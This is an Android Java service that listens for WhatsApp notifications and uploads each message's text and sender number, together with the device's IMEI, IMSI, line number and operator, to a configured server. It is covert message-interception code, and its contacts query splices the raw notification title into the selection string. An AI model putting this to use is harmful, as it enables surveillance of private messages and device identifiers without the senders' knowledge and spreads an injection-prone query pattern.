package com.example.myapplication;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.TelephonyManager;
import android.util.Log;
import androidx.annotation.RequiresApi;
import org.json.JSONException;
import org.json.JSONObject;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;

public class WhatsappListener extends NotificationListenerService {

    Context context;
    private boolean firstTime = true;
    int userId;

    @Override
    public void onCreate() {

        super.onCreate();
        context = getApplicationContext();
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onNotificationPosted(StatusBarNotification sbn){

        if(SaveSharedPreference.getLoggedStatus(context)) {

            userId = SaveSharedPreference.getUserId(context);

            if (firstTime) {

                String pack = sbn.getPackageName();
                Bundle extras = sbn.getNotification().extras;
                String title = extras.getString("android.title");
                String text = extras.getCharSequence("android.text").toString();

                if (pack.equals("com.whatsapp")) {

                    JSONObject clientInformation = getClientInformation(context);
                    String phoneNumber = getPhoneNumber(title, context);

                    if (phoneNumber.equals("Unsaved")) {

                        phoneNumber = title.replaceAll("\\s+", "");
                    } else {
                        phoneNumber = phoneNumber.replaceAll("\\s+", "");
                    }

                    try {
                        clientInformation.put("MSG", text);
                        clientInformation.put("PHONENUMBER", phoneNumber);
                        clientInformation.put("TYPE", "whatsapp");
                        clientInformation.put("USERID",userId);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    MediaType MEDIA_TYPE = MediaType.parse("application/json; charset=utf-8");
                    RequestBody body = RequestBody.create(MEDIA_TYPE, clientInformation.toString());
                    String url = SaveSharedPreference.getUrl(context);
                    String token = SaveSharedPreference.getToken(context);
                    token = "Bearer " + token;

                    try{
                        Request request = new Request.Builder().url(url).post(body).header("Authorization", token).build();
                        new insertMessageToDB().execute(request);
                    }catch(IllegalArgumentException e){
                        e.printStackTrace();
                    }
                }

                firstTime = false;
            } else {
                firstTime = true;
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {

        Log.i("Msg","Notification Removed");
    }

    public String getPhoneNumber(String name, Context context) {

        String ret = null;
        String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME+" like'%" + name +"%'";
        String[] projection = new String[] { ContactsContract.CommonDataKinds.Phone.NUMBER};
        Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection, selection, null, null);

        if (c.moveToFirst()) {
            ret = c.getString(0);
        }
        c.close();

        if(ret==null)
            ret = "Unsaved";

        ret = ret.replaceAll("\\s+","");
        return ret;
    }

    @SuppressLint("MissingPermission")
    @RequiresApi(api = Build.VERSION_CODES.M)
    public JSONObject getClientInformation(Context context){

        String serviceName = Context.TELEPHONY_SERVICE;
        TelephonyManager m_telephonyManager = (TelephonyManager) context.getSystemService(serviceName);
        String IMEI, IMSI, OS, DEVICE, MODEL, PRODUCT, PNUMBER, OPERATOR;

        IMEI = m_telephonyManager.getDeviceId();
        IMSI = m_telephonyManager.getSubscriberId();
        OS = android.os.Build.VERSION.RELEASE;
        DEVICE = android.os.Build.DEVICE;
        MODEL = android.os.Build.MODEL;
        PRODUCT = android.os.Build.PRODUCT;
        PNUMBER = m_telephonyManager.getLine1Number();
        OPERATOR = m_telephonyManager.getSimOperator();

        JSONObject clientInformation = new JSONObject();
        try {
            clientInformation.put("IMEI",IMEI);
            clientInformation.put("IMSI",IMSI);
            clientInformation.put("OS",OS);
            clientInformation.put("DEVICE",DEVICE);
            clientInformation.put("MODEL",MODEL);
            clientInformation.put("PRODUCT",PRODUCT);
            clientInformation.put("PNUMBER",PNUMBER);
            clientInformation.put("OPERATOR",OPERATOR);
            clientInformation.put("INCOMING",true);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        return clientInformation;
    }
}
